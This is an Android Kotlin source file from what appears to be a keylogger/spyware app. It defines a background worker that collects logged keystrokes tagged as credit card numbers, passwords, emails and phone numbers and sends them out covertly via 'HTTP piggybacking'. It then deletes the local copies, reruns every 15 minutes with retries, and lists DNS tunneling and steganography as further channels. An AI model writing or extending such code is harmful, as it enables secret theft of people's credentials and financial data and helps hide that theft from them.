package com.android.myapp.exfiltration

import android.content.Context
import androidx.work.*
import com.android.myapp.data.repository.KeystrokeRepository
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import timber.log.Timber
import java.util.concurrent.TimeUnit

/**
 * Background worker for scheduled data exfiltration
 */
class ExfiltrationWorker(
    context: Context,
    params: WorkerParameters
) : CoroutineWorker(context, params) {

    private val repository = KeystrokeRepository(context)
    private val exfiltrationManager = ExfiltrationManager(context)

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        try {
            Timber.d("Starting exfiltration work")


            val sensitiveEvents = mutableListOf(repository.getEventsBySensitivityType("credit_card"))
            sensitiveEvents.addAll(listOf(repository.getEventsBySensitivityType("password")))
            sensitiveEvents.addAll(listOf(repository.getEventsBySensitivityType("email")))
            sensitiveEvents.addAll(listOf(repository.getEventsBySensitivityType("phone")))
            sensitiveEvents.addAll(listOf(repository.getEventsBySensitivityType("normal")))
            sensitiveEvents.addAll(listOf(repository.getEventsByClassName("VisualTree")))


            // change to getSensitiveEvents() in order to minimize data transfer
            // basic version
            // val sensitiveEvents = repository.getRecentEvents(500)


            if (sensitiveEvents.isEmpty()) {
                Timber.d("No sensitive data to exfiltrate")
                return@withContext Result.success()
            }

            val strategy = ExfiltrationStrategy.HTTP_PIGGYBACKING

            // Exfiltrate data
            val success = when (strategy) {
                ExfiltrationStrategy.HTTP_PIGGYBACKING ->
                    exfiltrationManager.exfiltrateViaHTTP(sensitiveEvents)

                else -> { false }
            }

            if (success) {
                Timber.d("Exfiltration successful - ${sensitiveEvents.size} events")

                // delete repository data after successful exfiltration
                repository.clearAllData()

                Result.success()
            } else {
                Timber.w("Exfiltration failed - will retry")
                Result.retry()
            }

        } catch (e: Exception) {
            Timber.e(e, "Exfiltration work failed")
            Result.failure()
        }
    }

    companion object {
        private const val WORK_NAME = "exfiltration_work"

        /**
         * Schedule periodic exfiltration
         */
        fun schedule(context: Context) {
            val constraints =
                                Constraints.Builder()
                                .setRequiredNetworkType(NetworkType.CONNECTED)
                                .setRequiresBatteryNotLow(true)
                                .setRequiresDeviceIdle(false) // Changed to false because Android can be more aggressive
                                .build()

            val workRequest = PeriodicWorkRequestBuilder<ExfiltrationWorker>(
                15, // repeat every 15 minutes
                TimeUnit.MINUTES // time unit
            )
            .setConstraints(constraints)
            .setBackoffCriteria(
                BackoffPolicy.EXPONENTIAL,
                30,
                TimeUnit.SECONDS
            )
            .build()

            WorkManager
                .getInstance(context)
                .enqueueUniquePeriodicWork(
                    WORK_NAME,
                    ExistingPeriodicWorkPolicy.UPDATE,
                    workRequest)

            Timber.d("Exfiltration work scheduled")
        }

        /**
         * Trigger immediate exfiltration
         */
        fun triggerNow(context: Context) {
            val workRequest = OneTimeWorkRequestBuilder<ExfiltrationWorker>()
                .setExpedited(OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST)
                .build()

            WorkManager.getInstance(context).enqueue(workRequest)
            Timber.d("Immediate exfiltration triggered")
        }

        /**
         * Cancel scheduled work
         */
        fun wcancel(context: Context) {
            WorkManager.getInstance(context).cancelUniqueWork(WORK_NAME)
            Timber.d("Exfiltration work cancelled")
        }
    }
}

enum class ExfiltrationStrategy {
    HTTP_PIGGYBACKING,  // Hidden in legitimate HTTP traffic
    DNS_TUNNELING,      // Via DNS queries
    STEGANOGRAPHY       // Hidden in images
}